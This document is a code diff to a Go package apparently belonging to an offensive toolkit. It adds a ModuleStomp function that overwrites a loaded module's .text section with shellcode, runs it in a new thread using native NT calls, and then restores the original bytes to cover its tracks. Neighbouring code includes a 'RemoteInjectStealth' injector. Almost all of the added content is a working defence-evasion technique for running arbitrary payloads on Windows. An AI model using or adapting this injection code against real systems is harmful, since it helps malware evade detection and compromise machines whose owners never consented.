@@ -5,6 +5,7 @@ package processinjection
 
 import (
 	"bufio"
+	"debug/pe"
 	"errors"
 	"fmt"
 	"log"
@@ -348,6 +349,115 @@ func RemoteInjectStealth(shellcode []byte, pid string, addresstoinject string) (
 		shellcode = nil
 	}()
 	return fmt.Sprintf("[+] Silently Jabbed Pid %s at %p\n", pid, unsafe.Pointer(baseAddressPtr)), nil
+}
+
+func ModuleStomp(shellcode []byte, addresstoinject string) (string, error) {
+	if strings.HasPrefix(addresstoinject, "0x") {
+		addresstoinject = strings.Split(addresstoinject, "0x")[1]
+	}
+	u, err := strconv.ParseUint(addresstoinject, 16, 64)
+	if err != nil {
+		return "", err
+	}
+	moduleHandle := uintptr(unsafe.Pointer(uintptr(u)))
+	dosHeader := (*peloader.ImageDOSHeader)(unsafe.Pointer(moduleHandle))
+	imageNtHeader := (*peloader.ImageNtHeader)(unsafe.Pointer(moduleHandle + uintptr(dosHeader.AddressOfNewEXEHeader)))
+	offset := unsafe.Sizeof(pe.FileHeader{}) + unsafe.Sizeof(uint32(1))
+	textPtr := uintptr(unsafe.Pointer(imageNtHeader)) + offset + uintptr(imageNtHeader.FileHeader.SizeOfOptionalHeader)
+	textSection := (*pe.SectionHeader32)(unsafe.Pointer(textPtr))
+	textSz := textSection.VirtualSize
+	if len(shellcode) > int(textSz) {
+		return "", errors.New("Payload too big for .text size")
+	}
+	log.Println("past size check")
+	var nBytesRead uint32
+	var base uintptr
+	var payloadLength uint32 = uint32(len(shellcode))
+	log.Println(payloadLength)
+	hProcess, err := windows.GetCurrentProcess()
+	if err != nil {
+		return "", err
+	}
+	log.Println("past get proc")
+	//err = rawapi.NtAllocateVirtualMemory(uintptr(hProcess), &base, 0, &payloadLength, windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	base, err = windows.VirtualAlloc(0, uintptr(payloadLength), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+	if err != nil {
+		return "", err
+	}
+	log.Println("past heap alloc")
+	textStart := uintptr(unsafe.Pointer(moduleHandle + uintptr(textSection.VirtualAddress)))
+	log.Printf(".text start %p", unsafe.Pointer(textStart))
+	err = rawapi.NtReadVirtualMemory(uintptr(hProcess), textStart, base, payloadLength, &nBytesRead)
+	if err != nil {
+		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		return "", err
+	}
+	log.Println("past mem read")
+	var oldProtect uint32
+	var szPtr uintptr = uintptr(textSz)
+	log.Printf("%p\n", unsafe.Pointer(textStart))
+	err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
+	if err != nil {
+		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		return "", err
+	}
+	log.Println("past virtual protect")
+	var nBytesWritten *uint32
+	err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), nBytesWritten)
+	if err != nil {
+		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		return "", err
+	}
+	log.Println("past write")
+	err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, oldProtect, &oldProtect)
+	if err != nil {
+		//err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		return "", err
+	}
+	log.Println("past revert prot")
+	var remoteThread uintptr
+	err4 := rawapi.NtCreateThreadEx( //NtCreateThreadEx
+		&remoteThread,     //hthread
+		0x1FFFFF,          //desiredaccess
+		0,                 //objattributes
+		uintptr(hProcess), //processhandle
+		textStart,         //lpstartaddress
+		0,                 //lpparam
+		uintptr(0),        //createsuspended
+		0,                 //zerobits
+		0,                 //sizeofstackcommit
+		0,                 //sizeofstackreserve
+		0,                 //lpbytesbuffer
+	)
+
+	if err4 != nil {
+		log.Println("thread failed")
+		rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
+		rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, base, uintptr(payloadLength), nBytesWritten)
+		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		return "", err4
+	}
+	go func() {
+		log.Println("before wait")
+		windows.WaitForSingleObject(windows.Handle(remoteThread), windows.INFINITE)
+		log.Println("after wait")
+		err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, windows.PAGE_READWRITE, &oldProtect)
+		log.Println("after prot")
+		err = rawapi.NtWriteVirtualMemory(uintptr(hProcess), textStart, base, uintptr(payloadLength), nBytesWritten)
+		log.Println("after write")
+		err = rawapi.NtProtectVirtualMemory(uintptr(hProcess), textStart, &szPtr, oldProtect, &oldProtect)
+		log.Println("after prot")
+		err = windows.VirtualFree(base, 0, windows.MEM_RELEASE)
+		if err != nil {
+			log.Println(err)
+		}
+		//winapi.HeapDestroy(heap)
+		log.Println("after destroy")
+		windows.CloseHandle(windows.Handle(remoteThread))
+		log.Println("past thread")
+	}()
+	log.Println("past thread")
+	return "[+] Worked.", nil
 }
 
 func LoadPE(shellcode []byte, args []string) (string, error) {
